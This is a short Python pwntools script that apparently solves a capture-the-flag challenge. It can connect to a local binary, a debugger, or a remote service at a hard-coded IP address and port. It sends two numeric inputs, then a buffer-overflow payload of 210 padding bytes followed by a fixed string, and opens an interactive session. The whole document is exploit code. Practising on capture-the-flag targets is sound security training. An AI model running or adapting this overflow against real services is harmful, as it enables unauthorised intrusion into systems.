from pwn import * 

def conn(): 
    if args.GDB: 
        return gdb.debug(args.BINARY, 
        gdbscript="""
        continue
        """)  
    elif args.REMOTE: 
        return remote('52.184.85.16', 12345)
    else: 
        return process(args.BINARY)

def solve(): 
    p = conn()
    padding = 'T' * 210
    payload = padding 
    
    payload+="objectionably"

    p.sendline("13523148")
    p.sendline("1")
    p.sendline(payload) 
    p.interactive() 

solve()